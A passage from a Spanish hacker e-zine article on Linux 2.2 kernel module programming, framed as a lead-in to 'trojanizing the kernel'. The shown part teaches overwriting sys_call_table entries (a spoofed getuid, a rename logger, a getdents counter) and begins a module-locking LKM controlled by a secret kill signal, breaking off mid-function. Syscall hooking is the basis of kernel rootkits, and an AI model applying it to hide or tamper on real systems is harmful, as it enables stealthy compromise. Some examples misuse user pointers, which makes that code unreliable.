@@ -1,0 +1,4859 @@
+   -=( 7A69#12 )=--=( art4 )=--=( Linux LKMs; Troyanizando )=--=( Ripe )=-
+                                ( el kernel.               )
+
+0. Indice
+---------
+
+                  0. Indice
+		  1. Introduccion
+		  2. x86 y su modo protegido
+		  3. Las syscalls
+		  4. Programacion de LKMs
+		     4.1. Breve introduccion
+		     4.2. Hello world!! Good bye World!!
+		     4.3. Compilando modulos
+		     4.4. Cargando/Descargando modulos
+		     4.5. Leiendo parametros
+		     4.6. Otras macros
+		     4.7. Accediendo a las syscalls
+		     4.8. Modificando las sycalls
+		     4.9. Tratando con la memoria
+		     4.10. Creando dispositivos
+		     4.11. Un par de LKMs ¿utiles?
+		  5. Uso de LKMs para provecho person (Troyanizando el kernel)
+                     5.1. Ocultando ficheros
+		     5.2. Ocultando procesos
+		     5.3. Ocultando el modo promiscuo de las interfaces de red
+		     5.4. Sniffing desde el kernel
+                     5.5. Evadiendo los logs del sistema
+		     5.6. Ocultando conexiones al sistema
+		     5.7. Redireccionando ejecuciones
+		     5.8. Abriendo una backdoor remota
+		        5.8.1. Redireccionando /bin/login
+                     5.9. Ocultando el propio modulo
+                  6. Soluciones para la administracion
+		     6.1. Recomendaciones para asegurar el kernel
+		     6.2. Pelea: Detectando y evadiendo la deteccion de
+		          syscalls troyanizadas.
+                  7. Marchando
+		     7.1. Agradecimientos
+		     7.2. Saludos
+		     7.3. Contactar
+                     7.4. Bibliografia
+		     7.5. Nota final
+
+
+1. Intoduccion
+--------------
+
+     Hace realmente poco tiempo que he sentido atraccion por los LKM 
+(Loadable Kernel Modules), pero la fuerza de esta atraccion me ha llevado a 
+informarme, y mucho, sobre el tema.
+
+     La programacion de LKMs es, sin lugar a dudas, un arte, un "algo" 
+necesario para que los coders que adoran la programacion a bajo nivel (yo pese
+a mis escasos conocimientos me considero uno de ellos). No se puede expresar 
+en palabras la sensacion que conlleva ver un LKM bien programado, pero he de
+decir que es realmente gratificatoria. Asi pues cuando veo modulos como
+$#%&@ (censurado, por privacidad del source) quedo maravillado ante la 
+belleza que tienen algunos coders españoles. Chapo, ya sabes quien eres.
+
+     Dejando a un lado la palabreria inutil centremonos en lo que realmente
+importa, el arte, los LKMs.
+
+     Las siglas LKM, como bien habeis visto un poco mas arriba, responden a 
+las siglas de Loadable Kernel Module (Modulo de Kernel Cargable), y no son 
+mas que modulos que quita y pon para el kernel. La utilidad de estos modulos 
+es mucha pues evita la recompilacion total del kernel cada vez que queramos
+modificar alguna cosa en el mismo.
+
+NOTA: Antes que nada, destacare que este articulo esta orientado al kernel
+      2.2.x de linux, debido a mi nula experiencia de momento con el 
+      nuevo 2.4.x.
+
+
+
+
+2. x86 y su modo protegido
+--------------------------
+
+     La mayoria conocereis, seguro, la existencia del modo protegido de la
+familia de procesadores x86 (apartir del 386), aun asi dare una breve
+explicacion para aquellos que andan un poco despistados.
+
+     Cuando hablamos del modo protegido del x86 hablamos de los 4 niveles de 
+privilegios que puede tomar un codigo en ejecucion. Estos son ring0, ring1,
+ring2 y ring3. Comentare el ring0 y el ring3 que son los usado por Linux.
+El ring0 es el modo administrador (no hay que confundir con los uid's del 
+sistema), en este nivel se puede hacer realmente cualquier cosa; modificar 
+todos los registros, acceder a todas las zonas de la memoria de forma 
+directam, mientras que el ring3 esta sujeto a ciertas limitaciones, como el
+acceso a algunos registros o acceso directo a memoria. En linux, el kernel
+corre en ring0 y los procesos de usuario en ring3, por ello los procesos no
+tienen acceso directo a memoria y precisan de unas tablas de posiciones de
+memoria virtual que gestiona el kernel (El kernel traduce constantemente las
+direcciones virtuales de cada uno de lo procesos por su direccion real para
+poder trabajar), y si un proceso intenta acceder a una zona de memoria que no
+le pertenece el kernel mata el proceso de immediato, es entonces cuando nos
+aparece el tipico mensagito "segmentation fault".
+
+
+
+
+3. Las syscalls
+---------------
+
+     Debido a las restricciones del ring3, un proceso de usuario no podria 
+crear un socket, por ejemplo, sin la ayuda del kernel. Para este tipo de 
+tareas el kernel proporciona a los procesos una serie de llamadas al systema o
+syscalls. Cuando un proceso precisa del uso de una syscall colocara en eax el 
+numero asociado con la syscall solicitada y los parametros en ebx, ecx, 
+edx... para seguidamente avisar al kernel mediante la interrupcion 0x80, el 
+cual leera los registros adecuados para saber que debe hacer (ejecutandose en 
+ring0). Parece facil, y lo es. Pero la cosa no termina aqui. Para saber a que
+posicion de la memoria saltar el kernel se sirve de un vector de punteros a
+las syscalls. Si no ando errado Linux consta actualmente de (recordad que
+tratamos con el kernel 2.2.x) 190 syscalls, las cuales podeis ver en 
+/usr/include/bits/syscall.h.
+
+
+
+
+4. Programacion de LKMs
+-----------------------
+
+
+
+    4.1. Breve introduccion
+    -----------------------
+      
+     Antes de inciarnos en la programacion de LKMs debemos saber algunas 
+cosas. En primer lugar dire que los LKM pueden ser tanto cargados como 
+descargados, por ello, cuando programamos un modulo de este tipo, debemos 
+tener en cuenta las dos rutinas necesarias init_module(), ejecutada antes de 
+cargar el modulo y cleanup_module(), ejecutada despues de la descarga del 
+modulo.Ademas he de decir que para que los ficheros de inclusion seleccion el 
+codigo para el un modulo de kernel debemos declarar antes que nada las macros 
+__KERNEL__ y MODULE. Tambien es necesaria la inclusion de los ficheros 
+<linux/kernel.h>, <linux/module.h> y <linux/version.h>.
+
+
+
+
+    4.2. Hello world!! GoodBye world!!
+    ----------------------------------
+    
+     Como siempre empezaremos por el ejemplo mas simple, el hello world (que 
+en este caso devido a la naturaleza de carga y descarga sera hello world y
+goodbye world). Destacar que para imprimir usaremos printk() y no printf()
+ya que desde el kernel no podemos imprimir directamente en el terminal.
+¿Donde se imprime entonces? Pues en /var/log/messages.
+
+      En este primer ejemplo, de facilisima comprension, usaremos las rutinas
+init_module() y cleanup_module() para decir hola y adios respectivamente.
+Veamos el codigo que seguro que os lo aclara mucho mas:
+
+---/ hello_goodbye_world.c /---
+
+/*
+ * Antes que nada todo lo que dije que era necesario.
+ */
+#define __KERNEL__
+#define MODULE
+
+#include <linux/kernel.h>
+#include <linux/module.h>
+#include <linux/version.h>
+
+/*
+ * La rutina init_module() dara la bienvenida al mundo.
+ */
+int init_module() {
+  printk("Hello World!\n");
+  return(0);      /* Retornamos 0, no hay error */
+}
+
+/*
+ * La rutina cleanup_module se despide del mundo. Hasta la proxima!
+ */
+void cleanup_module() {
+  printk("GoodBye World!\n");
+}
+
+---/ hello_goodbye_world.c /---
+
+     No creo que necesiteis mas explicacion para entender esto :)
+
+
+
+
+    4.3. Compilando modulos
+    -----------------------
+    
+     Posiblemente algunos de vosotros os habreis sentido tentados, por la
+costumbre, a hacer "gcc hello_goodbye_world.c -o hello_goodbye_world" y
+habreis visto que nanai. El caso es que la compilaciond de Loadable Kernel
+Modules es algo distinta, debemos pasar los parametros siguientes, atento; 
+"-O2 -c -I/usr/src/linux/include" (dependiendo, claro, de donde tengamos
+nostros las fuentes del kernel), asi pues la compilacion de nuestro primer
+LKM seria:
+
+
+   barracuda ~# gcc -O2 -c -I/usr/src/linux/include hello_goodbye_world.c
+   barracuda ~#
+
+
+     Lo cual, y devido al parametro "-c" pasado, nos generara un fichero objeto
+(*.o) que insertaremos en el kernel usando insmod.
+
+
+
+
+    4.4. Cargando/Descargando modulos
+    ---------------------------------
+    
+     Para cargar y descargar modulos se usan las llamadas modutils, en el kernel
+2.2.x realizaremos la insercion del modulo con insmod y la descarga con 
+rmmod. Veamos que facil:
+
+
+   barracuda ~# insmod hello_goodbye_world.o
+   barracuda ~# rmmod hello_goodbye_world
+   barracuda ~#
+
+
+     Y ahora... veamos a donde han ido a parar los printk's.
+
+
+   barracuda ~# tail -n 2 /var/log/messages
+   May   4 03:48:21 localhost Hello World!
+   May   4 03:48:56 localhost GoodBye World!
+   barracuda ~#   
+   
+   
+
+
+    4.5. Leiendo parametros
+    -----------------------
+    
+     La mayoria de los modulos programados tienen como finalidad posiblitar 
+la utilidad de algun dispositivo (un lector de CD, un dispositivo USB, una
+targeta de sonido....) y en muchos casos es necerario especificar un IRQ y
+una direccion IO. Seria muy molesto si nos vieramos obligados a recompilar
+el modulo cada vez que precisasemos del cambio de uno de estos valores. Por
+ello en <linux/module.h> se definen un macro para la lectura de paramtros;
+MODULE_PARM. En dicho fichero de cabecera encontramos:
+
+#define MODULE_PARM(var,type)             \
+const char __module_parm_##var[]          \
+__attribute__((section(".modinfo"))) =    \
+"parm_" __MODULE_STRING(var) "=" type
+
+     El uso de esta macro es realmente sencillo, basta con declarar fuera 
+de cualquier rutina de nuestro modulo (ojo, esto es importante) dicha macro
+colocando en var la variable en la que se almacenara el dato leido y en type
+el tipo de dato. Los tipos de datos son los siguientes:
+
+     b     byte
+     h     short
+     i     int
+     l     long
+     s     string
+     
+     Normalmente usaremos MODULE_PARM para leer un solo parametro por
+variable, pero tambien es posible pasar arrays, separandolos con comas.
+
+---/ read_parm.c /---
+
+#define __KERNEL__
+#define MODULE
+
+#include <linux/kernel.h>
+#include <linux/module.h>
+#include <linux/version.h>
+
+/*
+ * Aqui declaro las variables que se usaran para almacenar los parametros.
+ */
+char b;
+short h;
+int i;
+int a[3]; 
+long l;
+char *s;
+
+/*
+ * Ahora viene las macros que se encargaran de hacer que las variables
+ * declaradas anteriormente adquieran el valor pasado.
+ */
+MODULE_PARM(b, "b");
+MODULE_PARM(h, "h");
+MODULE_PARM(i, "i");
+MODULE_PARM(a, "3-3i");
+MODULE_PARM(l, "l");
+MODULE_PARM(s, "s");
+
+/*
+ * La rutina init_module() usara printk para imprimir los parametros leidos.
+ */
+int init_module() {
+  if (!b || !h || !i || !l || !s) {
+    printk("Falta algun parametro por pasar\n");
+    return(-1); /* Ehh, los parametros */
+  }
+  printk("Cargando modulo\n");
+  printk("byte=%i   %c\n", (int)b, b);
+  printk("short=%i\n", (int)h);
+  printk("int=%i\n", i);
+  printk("int=%i, %i, %i\n", a[0], a[1], a[2]);
+  printk("long=%i\n", (int)l);
+  printk("string=%s\n", s);
+  return(0);   /* Todo correcto */
+}
+
+void cleanup_module() {
+  printk("Descargando modulo\n");
+}
+
+---/ read_parm.c /---
+
+     Veamos como pasariamos los argumentos al modulo:
+     
+     
+    barracuda ~# insmod read_parm.o b=37 h=23 i=5 a=1,2,3 l=32 s="buenos dias"
+    barracuda ~# tail -n 7 /var/log/messages
+    May   6 01:43:23 localhost Cargando modulo
+    May   6 01:43:23 localhost byte=37   %
+    May   6 01:43:23 localhost short=23
+    May   6 01:43:23 localhost int=5
+    May   6 01:43:23 localhost int=1, 2, 3
+    May   6 01:43:23 localhost long=32
+    May   6 01:43:23 localhost string=Buenos dias
+    barracuda ~#
+
+
+     MODULE_PARM proporciona tambien un control de arrays para especificar
+un minimo y un maximo en los datos leidos para un array. Especificaremos el
+rango valido junto al tipo usando la forma A-B, donde A sera el valor minimo
+y B el valor maximo (Es posible especificar solo el minimo, ignorando el
+maximo). El siguiente modulo pedira un array de datos de tipo int,
+comprendido con entre 3 y 7 elementos.
+
+
+
+
+    4.6 Otras macros
+    ----------------
+     
+     Ademas de MODULE_PARM, <linux/module.h> nos deleita con otra serie de
+macros utiles, como pueden ser las siguientes:
+
+     -> MODULE_PARM_DESC se encarga de dar una breve descripcion de cada uno de
+los parametros pasados.
+
+#define MODULE_PARM_DESC(desc)                                          \
+const char __module_description[] __attribute__((section(".modinfo")))= \
+"description=" desc
+
+     -> MODULE_AUTHOR se usa para especificar el coder del modulo.
+
+#define MODULE_AUTHOR(name)                                             \
+const char __module_author[] __attribute__((section(".modinfo")))=      \
+"author=" name
+
+     -> MODULE_SUPPORTED_DEVICE especifica los dispositivos soportados por
+el modulo.
+
+#define MODULE_SUPPORTED_DEVICE(dev)                                    \
+const char __module_device[] __attribute__((section(".modinfo"))) =     \
+"device=" dev
+
+     -> MODULE_DESCRIPTION se usa para proporcionar una breve descripcion del
+modulo.
+
+#define MODULE_DESCRIPTION(desc)                                        \
+const char __module_description[] __attribute__((section(".modinfo"))) =\ 
+"description=" desc
+
+     Posiblemente no sea necesario un ejemplo para ilustrar estas macros,
+pues son realmente faciles de entender, sinembargo prefiero acompañarlo de
+un ejemplo para seguir la politica teoria-ejemplo, teoria-ejemplo.... Asi
+que aqui teneis el ejemplo.
+
+---/ macros.c /---
+
+#define __KERNEL__
+#define MODULE
+
+#include <linux/kernel.h>
+#include <linux/module.h>
+#include <linux/version.h>
+
+MODULE_AUTHOR("Ripe - <ripe@7a69ezine.org>");
+MODULE_DESCRIPTION("Modulo de ejemplo para macros como esta");
+MODULE_SUPPORTED_DEVICE("sound"); /* No es un modulo de sonido, pero algo
+                                     habia que poner */
+
+int i;
+
+MODULE_PARM(i, "i");
+MODULE_PARM_DESC(i, "Dato de tipo int a leer :)");
+
+int init_module() {
+  if (!i) {
+    printk("No has pasado el parametro necesario\n");
+    return(-1);
+  }
+  printk("Modulo cargado\n");
+  return(0);
+}
+
+void cleanup_module() {
+  printk("Modulo descargado\n");
+}
+
+---/ macros.c /---
+
+     Dificil, eh!
+
+
+
+
+    4.7 Accediendo a las syscalls
+    -----------------------------
+    
+     Hemos hablado anteriormente de las syscalls, comentando que el kernel
+se sirve de un vector para saber a que posicion de la memoria saltar para
+atender cada syscall. Desde un LKM podemos acceder a dicho vector,
+unicamente necesitamos declarar lo siguiente:
+
+extern void *sys_call_table[];
+
+     Para acceder aceder a la direccion de cada una de las syscalls
+deberiamos saber su posicion dentro de sys_call_table, pero es realmente
+dificil memorizar la posicion de cada una de las llamadas al sistema dentro
+de dicho vector. Para ello linux nos brinda con <asm/unistd.h> donde tenemos
+definidas una serie de macros que nos permiten acceder de forma facil a cada
+una de las syscalls de la siguiente manera:
+
+sys_call_table[__NR_write];     /* Con esto sacamos la posicion en la memoria
+                                   de la syscall write */
+				   
+     Si necesitamos llamar a una syscall dentro de un LKM no podremos usar
+directamente la direccion proporcionada por el vector, sino que deberemos
+realizar una copia en un dato de tipo puntero a una funcion. Quiza suena
+algo raro, pero seguro que con el siguiente ejemplo os queda mucho mas claro.
+
+---/ modgetuid.c /---
+
+#define __KERNEL__
+#define MODULE
+
+#include <linux/kernel.h>
+#include <linux/module.h>
+#include <linux/version.h>
+
+#include <sys/types.h>    /* Necesaria para el uso del tipo de dato uid_t    */
+#include <asm/unistd.h>   /* Para poder referirnos a las syscalls con __NR_* */
+
+/*
+ * Este es el vector que contiene la direccion de todas las syscalls
+ */
+extern void *sys_call_table[];
+
+/*
+ * Declaramos un puntero a funcion, para copiar la direccion de la syscall,
+ * para asi poder usarla
+ */
+uid_t (*o_getuid)();       
+
+int init_module() {
+  uid_t uid;
+  o_getuid=sys_call_table[__NR_getuid];  /* Copia la direccion de la syscall */
+  uid=(*o_getuid)();                     /* La usamos :)                     */
+  printk("uid=%i\n", (int)uid);
+  return(0);
+}
+
+void cleanup_module() {
+}
+
+---/ modgetuid.c /---
+
+
+
+
+    4.8 Modificando las syscalls
+    ----------------------------
+    
+     Al tener acceso al array de posiciones en la memoria de las rutinas de
+las sycalls, nadie nos prohibe modificar alguno de los varlores de dicho
+array con lo que estariamos modificanco la posicion a la que se saltaria al
+llamar a dicha syscall.
+
+     Normalmente usaremos init_module() para guardar el valor las
+direcciones originales y asignar las nuetras, y cleanup_module() para
+restaurar los valores originales. El siguiente ejemplo hace que getuid
+retorne siempre el valor pasado por el parametro uid.
+
+---/ my_getuid.c /---
+
+#define __KERNEL__
+#define MODULE
+
+#include <linux/kernel.h>
+#include <linux/module.h>
+#include <linux/version.h>
+
+#include <sys/types.h>
+#include <asm/unistd.h>
+
+extern void *sys_call_table[];
+
+uid_t (*o_getuid)();
+
+int uid;
+
+MODULE_PARM(uid, "i");
+
+/*
+ * Esta la funcion que substitira a la autentica getuid. Haremos que siempre
+ * retorne el parametro leido.
+ */
+uid_t my_getuid(void) {
+  return(uid);
+}
+     
+int init_module() {
+  o_getuid=sys_call_table[__NR_getuid];  /* Guardamos el valor original para
+                                            poder restaurarlo cuando sea
+					    necesario */
+  sys_call_table[__NR_getuid]=my_getuid; /* Ahora hacemos que la syscall
+                                            getuid llame a nuestra funcion */
+  printk("Modulo cargado, ahora getuid retornara siempre %i\n", uid);
+  return(0);
+}
+
+void cleanup_module() {
+  sys_call_table[__NR_getuid]=o_getuid;  /* Restauramos el valor original */
+  printk("Modulo descargado\n");
+}
+
+---/ my_getuid.c /---
+
+     Realmente este LKM que acabamos de ver no tiene utilidad alguna,
+sinembargo es perfecto para ilustrar el como hacer que un modulo cambie la
+accion de una syscall. Lo primero que necesitamos es hacer nuestra version
+de la syscall, que en este caso es la funcion my_getuid(), la cual, como se
+puede ver retorna siempre el numero que le hemos pasado como parametro. Lo
+segundo es hacer que init_module() haga que el vector sys_call_table[] diga
+que la dirrecion de my_getuid() es la de la syscall, y que cleanup_module()
+restaure el valor original, para lo que init_module() tendra que haber
+guardado una copia. La cosa, contada de forma generica vendria a ser una
+cosa asi (Resumiendo...):
+
+     -> La funcion my_syscall() es nuetra version de la syscall a modificar.
+
+int my_syscall() {
+  /* nuestra accion */
+}
+
+     -> La funcion init_module() se encarga de guardar una copia de la
+posiscion en la memoria de la syscall original, para luego substituirla en
+el vector por nuestra funcion. 
+
+int init_module() {
+  o_syscall=sys_call_table[__NR_syscall];
+  sys_call_table[__NR_syscall]=my_syscall;
+  return(0);
+}
+
+     -> Al descargar el modulo hemos de dejarlo todo como estaba al
+principio. Para ello restauramos la syscall original gracias a la copia que
+guardamos en init_module().
+
+void cleanup_module() {
+  sys_call_table[__NR_syscall]=o_syscall;
+}
+
+     Ir con cuidado a la hora de hacer esto bien, de lo contrario vuestro
+kernel puede sentirse resentido al decargar el modulo, ya que la syscall
+tratara de saltar a una direccion erronea :)
+
+
+
+
+    4.9. Tratando con la memoria
+    ----------------------------
+    
+     Como ya sabeis los programas de usuario no conocen las direcciones en
+la memoria reales en la que estan operando, de manera que cuando llaman a
+una syscall que precisa de un puntero pasan como argumento un puntero a la
+direccion virtual gestionada por el kernel. Este debe trabaja con posiciones
+en la memoria reales, por lo que necesitamos de un sistema para copiar datos
+de/a la memoria de usuario a/desde la memoria del kernel, para ello usaremos
+basicamente dos rutinas, __generic_copy_from_user() y
+__generic_copy_to_user(). El uso de dichas funciones puede asociarse al uso
+de memcpy(), se le especifica un origen, un destino, y la cantidad de datos
+a copiar. Siempre que queramos pasar datos que se encuentran en la memoria
+del kernel a memoria de usuario (y viceversa) tendremos que hacer uso de
+ellas. Y ahora, como siempre, un ejemplo muy sencillo.
+
+---/ my_rename.c /---
+
+#define __KERNEL__
+#define MODULE
+
+#include <linux/kernel.h>
+#include <linux/module.h>
+#include <linux/version.h>
+
+#include <linux/mm.h>
+
+#include <sys/syscall.h>
+
+extern void *sys_call_table[];
+
+int (*o_rename)(const char *oldpath, const char *newpath);
+
+int my_rename(const char *oldpath, const char *newpath) {
+  char *oldpath_kernel=(char *)kmalloc(strlen(oldpath)+1, GFP_KERNEL);
+  char *newpath_kernel=(char *)kmalloc(strlen(newpath)+1, GFP_KERNEL);
+  memset(oldpath_kernel, 0, strlen(oldpath)+1);
+  memset(newpath_kernel, 0, strlen(newpath)+1);
+/*
+ * Tenemos la intencion de imprimir en /var/log/messages el nuevo y el viejo
+ * path del fichero, pero no podemos usar los punteros pasados a la syscall,
+ * pues apuntan a una posicion virtual en la memoria del proceso, por ello
+ * usamos __generic_copy_from_user() para hacer una copia de los strings en
+ * la memoria del kernel. En los punteros que hemos declarado.
+ */ 
+  __generic_copy_from_user(oldpath_kernel, oldpath, strlen(oldpath));
+  __generic_copy_from_user(newpath_kernel, newpath, strlen(newpath));
+  printk("Rename usado: %s --> %s\n", oldpath_kernel, newpath_kernel);
+/*
+ * Llamamos a la autentica syscall para que el cambio de nombre se produzca,
+ * sino mal royo.
+ */
+  kfree(oldpath_kernel);
+  kfree(newpath_kernel);
+  return((*o_rename)(oldpath, newpath));
+}
+
+int init_module() {
+/*
+ * Os suena?
+ */
+  o_rename=sys_call_table[__NR_rename];
+  sys_call_table[__NR_rename]=my_rename;
+  return(0);
+}
+
+void cleanup_module() {
+  sys_call_table[__NR_rename]=o_rename;
+}
+
+---/ my_rename.c /---
+
+     Como podeis ver, para realizar la copia antes he tenido que reservar
+memoria en la zona del kernel, para ello hemos usado kmalloc(), en el primer
+argumento especificamos la cantidad de memoria a reservar y en el segundo la
+zona en la que se va a reservar, GFP_KERNEL, o GFP_USER. Para volver a
+liberar la memoria hemos usado kfree().
+
+     Una vez cargado el modulo:
+     
+    barracuda ~# mv issue.net hax
+    barracuda ~# tail -n 1 /var/log/messages
+    May   9 17:12:10 localhost Rename usado: issue.net --> hax
+    barracuda ~#
+    
+    
+
+
+    4.10 Creando dispositivos
+    -------------------------
+    
+     En muchisimas ocasiones los LKMs se encargan de crear un dispositivo
+para poder comunicar los procesos de la user memory con el kernel,
+/dev/audio, /dev/hda o /dev/fd0 son algunos de estos ejemplos. En la mayoria
+de los modulos de ejemplo que he usado para este articulo he me he
+comunicado con el kernel usando alguna syscall (sys_kill, sys_rename...) por
+ser la forma mas sencilla. Pero crear un dispositivo para realizar este
+trabajo es tambien una propuesta mas que factible, y recomendable en muchos
+casos.
+
+     Como bien sabreis, en linux, cada uno de los dispositivos consta de un
+major number y un minor number. 
+
+
+     barracuda ~# ls -l /dev/audio
+     crw-rw----    1 root     audio     14,   4 Nov 30  2000 /dev/audio
+     barracuda ~#
+
+
+     Vemos que /dev/audio tiene como major number el 14 y como minor number el 
+4. Estos numeros son usado por el kernel para identificar el dispositivo en un
+registro que este contiene, y al que nosotros podemos añadir entradas usando 
+register_chrdev(), pasando como argumento el major number que queramos asignar
+al dispositivo, un nombre identificativo y una structura file_operators que
+contendra las rutinas encargadas de gestionar el dispositivo ante las posibles
+operaciones a realizar.
+
+---/ include/linux/fs.h /---
+
+struct file_operations {
+        loff_t (*llseek) (struct file *, loff_t, int);
+        ssize_t (*read) (struct file *, char *, size_t, loff_t *);
+        ssize_t (*write) (struct file *, const char *, size_t, loff_t *);
+        int (*readdir) (struct file *, void *, filldir_t);
+        unsigned int (*poll) (struct file *, struct poll_table_struct *);
+        int (*ioctl) (struct inode *, struct file *, unsigned int, unsigned long);
+        int (*mmap) (struct file *, struct vm_area_struct *);
+        int (*open) (struct inode *, struct file *);
+        int (*flush) (struct file *);
+        int (*release) (struct inode *, struct file *);
+        int (*fsync) (struct file *, struct dentry *);
+        int (*fasync) (int, struct file *, int);
+        int (*check_media_change) (kdev_t dev);
+        int (*revalidate) (kdev_t dev);
+        int (*lock) (struct file *, int, struct file_lock *);
+};
+
+---/ include/linux/fs.h /---
+
+     Para mas informacion sobre cada una de las operaciones, lo mejor es 
+consultar las fuentes de los modulos de dispositivo contenidos en el kernel,
+asi como las paginas man. Lo que aqui voy a mostrar es un breve ejemplo que
+muestra la cantidad de veces que se ha usado getdents desde la carga del
+modulo cada vez que leamos del dispositivo.
+
+---/ my_device.h /---
+
+/*
+ * Este dispositivo es cutrisimo. Su unica finalidad es la de ilustrar
+ * el funcionamiento de un device... pero los devices dan mucho juego, asi
+ * que jugad con ellos :)
+ */
+
+#define __KERNEL__
+#define MODULE
+
+#include <linux/ctype.h>
+#include <linux/config.h>
+#include <linux/module.h>
+#include <linux/version.h>
+
+#include <linux/fd.h>
+#include <linux/unistd.h>
+#include <linux/fs.h>
+#include <linux/dirent.h>
+
+#include <syscall.h>
+
+extern void *sys_call_table[];
+
+ssize_t dev_read(struct file *f, const char *buf, size_t len, loff_t *offset);
+int dev_open(struct inode *i, struct file *f);
+int dev_close(struct inode *i, struct file *f);
+int dev_release(struct inode *i, struct file *f);
+
+/*
+ * Nuestras funciones que trataran las operaciones sobre nuestro
+ * dispositivo.
+ */
+struct file_operations fops = {
+  NULL,                 /* llseek */
+  (void *)dev_read,     /* read */
+  NULL,                 /* write */
+  NULL,                 /* readdir */
+  NULL,                 /* poll */
+  NULL,                 /* ioctl */
+  NULL,                 /* mmap */
+  (void *)dev_open,     /* open */
+  NULL,                 /* flush */
+  (void *)dev_release,  /* release */
+  NULL,
+  NULL,
+  NULL,
+  NULL,
+  NULL
+};
+
+/*
+ * El contador que usaremos para saber las veces que getdents se ha
+ * ejecutado desde la carga del modulo.
+ */
+int counter=0;
+
+/*
+ * Podemos pasar el mn por parametro... sino sera 0 (por lo que se tomara
+ * una entrada libre asignada por el kernel).
+ */
+int mn=0;
+MODULE_PARM(mn, "i");
+
+/*
+ * Buffer usado por el dispositivo.
+ */
+char dev_out[8192];
+char *out_ptr;
+
+/*
+ * Variable que usaremos para saber si el device esta abierto o no. Lo
+ * usamos para evitar que dos procesos abran el dispositivo a la vez, pues
+ * eso probocaria problemas.
+ */
+int opened=0;
+
+int (*o_getdents)(unsigned int, struct dirent *, unsigned int);
+
+int my_getdents(unsigned int fd, struct dirent *dirp, unsigned int count) {
+  counter++; /* magia */
+  return((*o_getdents)(fd, dirp, count));
+}
+
+/*
+ * Lo que dira nuestro dispositivo cuando se lea en el :)
+ */
+int do_entry() {
+  memset(dev_out, 0, 8192);
+  sprintf(dev_out, "Getdents ha sido usado %i veces desde la carga del modulo\n", counter);
+}
+
+/*
+ * Ahora las funciones para tratar el device.
+ */
+ssize_t dev_read(struct file *f, const char *buf, size_t len, loff_t *offset) {
+  int readed=0;
+  do_entry();
+  while (len && *out_ptr) {
+    __generic_copy_to_user(buf+readed, out_ptr, 1);
+    out_ptr++;
+    len--;
+    readed++;
+  }
+  return(readed);
+}
+
+int dev_open(struct inode *i, struct file *f) {
+  if (opened) return(-1);
+  opened=1;
+  memset(dev_out, 0, 8192);
+  out_ptr=dev_out;
+  return(0);
+}
+
+int dev_release(struct inode *i, struct file *f) {
+  opened=0;
+  return(0);
+}
+
+int init_module() {
+  /*
+   * Resgistramos el dispositivo en el kernel.
+   */
+  if ((mn=register_chrdev(mn, "my_device", &fops))<0) return(-1);
+  printk("Major number = %i\n", mn);
+  /*
+   * Pacheamos getdents para que se ejecute nuestro contador.
+   */
+  o_getdents=sys_call_table[__NR_getdents];
+  sys_call_table[__NR_getdents]=my_getdents;
+  counter=0;
+  return(0);
+}
+
+void cleanup_module() {
+  /*
+   * Desregistramos nuestro dispositivo...
+   */
+  unregister_chrdev(mn, "my_device");
+  /*
+   * ...y dejamos getdents como antes.
+   */
+  sys_call_table[__NR_getdents]=o_getdents;
+}
+
+---/ my_device.h /---
+
+     Fijaos que tras la descarga del modulo debemos desregistrar el
+dispositivo, para ello usaremos unregister_chrdev() tal y como se ve en el
+ejemplo.
+
+
+
+
+    4.11. Un par de modulos ¿utiles?
+    --------------------------------
+    
+     Antes de pasar a explicar las posiblidades que los LKMs nos dan para
+troyanizar un sistema creo que seria conveniente mostrar dos ejemplos
+sencillos de LKM que tienen alguna utilidad practica. He tratado de
+comentarlos un poco para que puedan ser entendidos bien, y, en principio, no
+deberian suponer ningun complicacion para vosotros.
+
+     El primero de ellos es un modulo que se encarga de asegurar que nadie
+nos troyanize el sistema usando otros modulos, para ello parcheo las
+syscalls init_module() y delete_module() evitando que personas no
+autorizadas sean capaces de cargar o descargar modulos (ni siquiera el root
+podra cargar/descargar un modulo sin saber el metodo). Lo que en este modulo
+hacemos es establecer una variable que indicara si se pueden cargar o
+descargar modulos (status.mperm), la cual podremos modificar usando kill
+pasando el signal y el pid adecuado (status.sig, status.key).
+
+---/ modprotect.c /---
+
+/*
+ * TILE: ModProtect v1.0 <3/5/2001>
+ *
+ * CODER: Ripe - <ripe@7a69ezine.org>
+ *
+ * DESCR: Loadable kernel module usage may be a security problem. If some
+ *        intruder enter in your system, he can troyanize your kernel
+ *        using a malicious LKM. With ModProtect you can hasten/unhasten the
+ *        LKM suport using kill command with a secret pid and secret signal.
+ *
+ * USAGE: When you load ModProtect you must to especify the secret pid
+ *        and secret signal usig module params. This is an example.
+ *
+ *         root@donasec.com ~# insmod modprotect.o sig=31 pid=7469 [-f]
+ *         root@donasec.com ~#
+ *
+ *        For default, the permission to load/unload Loadable kernel
+ *        module are OFF.
+ *
+ * RECOM: I recommend to hide ModProtect using the hider.c LKM for more
+ *        protection, because if one LKM have been hided it whouldn't be
+ *        unloaded never (only rebooting system).
+ *
+ * TESTED: This LKM have been tested whitout problems on:
+ *           - Linux kernel 2.2.18pre10 (Debian 2.2)
+ *           - Linux kernel 2.2.18 (Debian 2.2)
+ *           - Linux kernel 2.2.19 (debian 2.2, Slackware 7.1)
+ *
+ */
+
+#define __KERNEL__
+#define MODULE
+
+#include <linux/kernel.h>
+#include <linux/module.h>
+#include <linux/version.h>
+
+#include <sys/types.h>
+#include <signal.h>
+
+#include <sys/syscall.h>
+
+#define _7A69SOFT_
+#define CODER        "Ripe"
+
+#define DEF_KEY      7469
+#define DEF_SIG      31
+
+#define OFF          0x00
+#define ON           0x01
+
+extern void *sys_call_table[];
+
+int (*o_init_module)(const char *name, struct module *image);
+int (*o_delete_module)(const char *name);
+int (*o_kill)(pid_t pid, int sig);
+
+int key;
+int sig;
+
+struct {
+  int key;
+  int sig;
+  int mperm;
+} status;
+
+/*
+ * Estas dos rutinas my_init_module() y my_delete_module() substituiran a las
+ * rutinas reales cuando la carga/descarga de modulos este prohivida.
+ */
+int my_init_module(const char *name, struct module *image) {
+  (*o_delete_module)(name);  /* Esto tengo que ponerlo, porque sino la
+                                estructura module me queda cargada en
+				la lista enlazada... la verdad es que no
+				se bien bien porque ocurre, pero con esto
+				lo solucione */
+  return(-1);                /* Debemos retornar error, ehehe */
+}
+
+int my_delete_module(const char *name) {
+  return(-1);                /* Error... lo mismo que antes */            
+}
+
+/*
+ * Esta rutina la usaremos para que kill nos sirva para activa/desactivar la
+ * proteccion en la carga de modulos, podemos ver que lo que hago es alternar
+ * entre las rutinas reales y las que veis un pelin mas arriba :)
+ */
+int my_kill(pid_t pid, int sig) {
